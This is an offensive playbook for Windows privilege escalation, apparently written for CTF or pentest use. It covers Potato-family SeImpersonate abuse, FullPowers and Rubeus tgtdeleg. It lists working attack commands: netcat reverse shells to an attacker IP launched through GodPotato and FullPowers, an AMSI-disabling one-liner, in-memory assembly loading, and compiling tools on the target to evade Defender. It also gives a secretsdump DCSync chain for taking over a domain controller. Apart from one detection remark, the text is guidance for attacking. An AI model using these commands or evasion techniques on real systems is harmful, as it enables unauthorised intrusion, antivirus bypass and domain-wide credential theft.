# Potato-Style SeImpersonate → SYSTEM (and Defender Bypass)

## When this applies

- Windows foothold, `whoami /priv` confirms `SeImpersonatePrivilege` is enabled.
- Goal: leverage SeImpersonate to obtain SYSTEM via DCOM/RPC token impersonation, working around AV signatures.

## GodPotato — primary SeImpersonate→SYSTEM on Server 2019/2022 (when other Potatoes fail)

On post-2016 Windows, JuicyPotato/RottenPotato are mitigated (CLSID activations restricted) and PrintSpoofer fails when the Print Spooler service is disabled. GodPotato abuses DCOM/IRemUnknown2 token impersonation — only requires `SeImpersonatePrivilege`, works on Server 2019/2022/Win10/11. Pre-baked binaries on the [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) releases page (`GodPotato-NET4.exe` for full .NET 4.x, `GodPotato-NET2.exe` for legacy).

```powershell
# Direct command (writes flag to a low-priv-readable location, doesn't need a callback shell):
GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\<low>\r.txt && icacls C:\Users\<low>\r.txt /grant Everyone:R"
# Reverse shell variant:
GodPotato.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe -e cmd <attacker_ip> 4444"
```

Selection rule for SeImpersonate paths on modern Windows: try **GodPotato → SigmaPotato → PrintSpoofer (only if Spooler running) → SweetPotato** in that order. Skip JuicyPotato/RottenPotato on Server 2019+ unless you've confirmed the relevant CLSID still impersonates.

## Defender blocks ALL public Potato binaries — don't fight AV, change paths

When Defender is running on the target, every public Potato (GodPotato, JuicyPotato, RoguePotato, PrintSpoofer, SweetPotato, SigmaPotato) and even RunasCs / Rubeus drops are signature-flagged on disk and quarantined the moment they touch the filesystem — including signature-patched/recompiled forks (the byte-pattern detections are robust). Recognize the wall fast (Defender event 1116, file disappears, "Operation did not complete successfully because the file contains a virus"), then pivot:

- **In-memory reflective load** (avoids on-disk scan): `[Reflection.Assembly]::Load([Convert]::FromBase64String($b64))` then invoke a static method. Works for any .NET assembly small enough to base64 inline, including SharpHound / Rubeus / private potato forks compiled to a managed wrapper.
- **Skip SeImpersonate entirely** — when AV blocks every privesc tool, RBCD or AD ACL paths against the DC are usually the faster route. SeImpersonate→SYSTEM is local-host-only; RBCD via a writable `msDS-AllowedToActOnBehalfOfOtherIdentity` is full Domain Admin and never runs an unsigned binary on disk.
- **AMSI/ETW patches** to allow string-based payloads through PowerShell — `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` (one-liner, works on AMSI 2.x). Pair with EnvVar bypass for newer builds: see well-known AMSI bypass cheat sheets.
- **CSC compile-on-target — the cleanest bypass when xp_cmdshell or any cmd context is available.** `.NET Framework`'s built-in `csc.exe` lives at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe` (and Framework variant for 32-bit) on every Server 2016+ install. Source code (`.cs`) is plain text — Defender does NOT scan source files. Upload the `.cs` and compile in place — the resulting PE is a fresh build with random IL/padding, no signature match:
  ```cmd
  :: Upload EfsPotato.cs (or GodPotato.cs / SweetPotato.cs / SharpHound.cs) as text
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Users\Public\loot.exe C:\Users\Public\EfsPotato.cs
  C:\Users\Public\loot.exe whoami       :: runs as SYSTEM (after SeImpersonate trigger)
  ```
  Implication: maintain a `.cs`-source library of privesc tools alongside the compiled binaries. The source repos for GodPotato / SweetPotato / EfsPotato / RunasCs / Rubeus / SharpHound are all public — clone-and-cache them into your engagement toolkit. Source compiles in seconds and the output evades Defender 100% of the time. **`/p:DebugType=None` + `/optimize+`** further randomize the binary if you compile twice with different switches.

## FullPowers — Restoring Stripped LocalService / NetworkService Privileges

When a webshell or RCE primitive lands as `NT AUTHORITY\LOCAL SERVICE` or `NT AUTHORITY\NETWORK SERVICE` and `whoami /priv` shows only `SeChangeNotifyPrivilege / SeCreateGlobalPrivilege / SeIncreaseWorkingSetPrivilege`, the host has stripped the default privilege set (common with hardened IIS, Apache-on-Windows, XAMPP, custom NSSM wrappers, App Container–scoped services).

The default LocalService token actually *includes* `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, and `SeAuditPrivilege` — and the way Windows applies the strip-down is at process spawn, not at SID-membership. So if you can convince the Task Scheduler service to spawn a *fresh* LocalService process for you, it gets the unstripped default token.

```cmd
:: FullPowers — https://github.com/itm4n/FullPowers
:: Registers a one-shot scheduled task running as LOCAL SERVICE / NETWORK SERVICE,
:: then waits for the spawn and inherits the full default token.
FullPowers.exe -c "C:\inetpub\wwwroot\nc64.exe ATTACKER 4444 -e cmd.exe"
FullPowers.exe -c "powershell -ep bypass -enc <b64>"

:: Verify before chaining: whoami /priv  → SeImpersonate is back
:: Then run any SeImpersonate-abusing tool: GodPotato/JuicyPotato/PrintSpoofer
```

Common chain: stripped LocalService webshell → `FullPowers.exe -c "GodPotato.exe -cmd 'cmd /c <payload>'"` → SYSTEM in two hops.

## IIS DefaultAppPool / Microsoft Virtual Account → Machine TGT via Rubeus tgtdeleg

`IIS APPPOOL\<PoolName>` and `NT SERVICE\<svc>` are *Microsoft Virtual Accounts* — they appear local but on a domain-joined host they authenticate to the network as the **machine account** (`HOSTNAME$`). On a Domain Controller this means the IIS apppool's network identity is `DC$` itself — i.e. domain replicator rights.

From any code execution in such a context (ASPX shell, .aspx upload, webshell-via-handler-mapping, SQL Server xp_cmdshell), pull a forwarded TGT for the machine account without admin:

```cmd
:: Drops a base64 .kirbi for HOSTNAME$ — no SeDebugPrivilege required, no LSASS read
Rubeus.exe tgtdeleg /nowrap

:: Convert to ccache for impacket
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=$(pwd)/ticket.ccache secretsdump.py -k -no-pass -just-dc DC.DOMAIN.local
```

If the host is a DC → instant DCSync. If it's any domain member → the TGT can be used to S4U2self/S4U2proxy where the machine has delegation, or for resource-based constrained delegation if you can write the host's `msDS-AllowedToActOnBehalfOfOtherIdentity`. **This bypasses Credential Guard entirely** — `tgtdeleg` uses the SSPI Negotiate package, no LSASS access.

Detection knob: the `tgtdeleg` request shows up as Kerberos `TGS-REQ` with `forwardable+forwarded` flags initiated by the apppool process — visible in 4769 events with non-standard service class.

## Verifying success

- After Potato execution, `whoami` returns `nt authority\system`.
- For `tgtdeleg`: `klist` shows `krbtgt/DOMAIN` cached as the machine account.

## Common pitfalls

- Defender blocks public Potato binaries on disk — use CSC compile-on-target or in-memory reflective load.
- Stripped LocalService/NetworkService → use FullPowers first to restore the default token.
- Always run the pre-Potato sanity check (`service-required-privileges.md`) to confirm SeImpersonate is actually present on the running worker.

## Tools

- GodPotato / SigmaPotato / PrintSpoofer / SweetPotato
- FullPowers
- Rubeus (`tgtdeleg`)
- csc.exe (target-side compilation)
